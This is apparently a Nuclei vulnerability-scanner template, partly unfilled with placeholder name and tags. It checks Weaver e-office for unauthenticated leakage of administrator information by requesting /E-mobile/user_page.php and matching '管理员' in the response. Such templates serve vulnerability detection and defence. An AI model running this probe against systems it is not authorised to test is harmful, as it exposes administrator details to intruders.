id: weaver-eoffice-info
info:
  name: Template Name
  author: apple
  severity: low
  description: 泄露是泄露的管理员信息
  reference:
    - https://mp.weixin.qq.com/s/By1UCPPc_1utP0bBwXzpOw
  tags: tags
http:
  - raw:
      - |-
        GET /E-mobile/user_page.php HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
        Accept: */*
        Connection: Keep-Alive
    matchers:
      - type: word
        part: body
        words:
          - '管理员'
